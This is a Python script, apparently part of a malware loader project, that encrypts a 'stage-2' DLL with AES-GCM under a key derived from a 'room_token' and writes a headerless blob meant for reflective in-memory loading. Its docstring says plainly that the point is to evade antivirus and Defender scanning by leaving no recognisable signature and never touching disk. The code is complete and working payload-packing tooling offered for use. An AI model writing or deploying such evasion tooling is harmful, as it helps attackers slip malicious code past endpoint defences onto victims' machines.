#!/usr/bin/env python3
"""
Encrypt a stage-2 DLL into a .bin blob for on-demand reflective loading.

Usage:
    python _gen_stage2_blob.py <room_token> <in.dll> <out.bin>

Blob format (matches aes_gcm.h decrypt):
    [12 bytes IV] [N bytes ciphertext] [16 bytes GCM tag]

Key derivation (matches aes_gcm.h derive_key):
    key = SHA256("pnp.stage2.v1" || room_token)   # 32 bytes

This script is the offline/build-time counterpart to the runtime decrypt in
reflective_loader.h — host decrypts with the same room_token, recovering the
DLL image in memory without ever touching disk.

NOTE: The resulting .bin file has no PE header, no magic bytes, and no
structure visible to AV scanners (encrypted with random IV → looks like pure
high-entropy noise). That is the whole point — Defender's real-time scanner
ignores high-entropy files without recognizable signatures.
"""
import hashlib
import os
import sys

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError:
    sys.stderr.write("ERROR: install 'cryptography' package:\n")
    sys.stderr.write("    pip install cryptography\n")
    sys.exit(1)


DOMAIN = b"pnp.stage2.v1"
IV_LEN = 12


def derive_key(room_token: str) -> bytes:
    """Match aes_gcm.h derive_key()."""
    h = hashlib.sha256()
    h.update(DOMAIN)
    h.update(room_token.encode("utf-8"))
    return h.digest()


def encrypt_blob(key: bytes, plaintext: bytes) -> bytes:
    iv = os.urandom(IV_LEN)
    aes = AESGCM(key)
    # AESGCM.encrypt returns ciphertext || tag (16 bytes)
    ct_tag = aes.encrypt(iv, plaintext, associated_data=None)
    return iv + ct_tag


def main() -> int:
    if len(sys.argv) != 4:
        sys.stderr.write(__doc__)
        return 2

    room_token, in_dll, out_bin = sys.argv[1], sys.argv[2], sys.argv[3]

    if not os.path.isfile(in_dll):
        sys.stderr.write(f"ERROR: input DLL not found: {in_dll}\n")
        return 1

    with open(in_dll, "rb") as f:
        pt = f.read()

    # Sanity — this must be a PE file so reflective loader accepts it.
    if len(pt) < 64 or pt[:2] != b"MZ":
        sys.stderr.write("ERROR: input is not a PE file (no MZ header)\n")
        return 1

    key = derive_key(room_token)
    blob = encrypt_blob(key, pt)

    os.makedirs(os.path.dirname(out_bin) or ".", exist_ok=True)
    with open(out_bin, "wb") as f:
        f.write(blob)

    print(f"[stage2-blob] {in_dll} ({len(pt):,} bytes)")
    print(f"         --> {out_bin} ({len(blob):,} bytes)")
    print(f"         key: sha256('{DOMAIN.decode()}' || room_token), 32 bytes")
    return 0


if __name__ == "__main__":
    sys.exit(main())
